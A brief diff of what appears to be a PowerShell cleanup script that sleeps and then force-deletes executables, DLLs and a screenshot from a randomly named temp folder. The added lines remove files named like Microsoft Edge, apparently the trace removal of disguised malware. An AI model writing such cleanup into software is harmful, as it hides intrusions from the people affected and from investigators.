@@ -1,5 +1,7 @@
 Start-Sleep 10
 Remove-Item $env:temp\sVBXKuz\wsappa.exe -Force
+Remove-Item $env:temp\sVBXKuz\msedge.exe -Force
+Remove-Item $env:temp\sVBXKuz\microsoft_edge.exe -Force
 Remove-Item $env:temp\sVBXKuz\libsodium.dll -Force
 Remove-Item $env:temp\sVBXKuz\libopus.dll -Force
 Remove-Item $env:temp\sVBXKuz\screenshot.png -Force
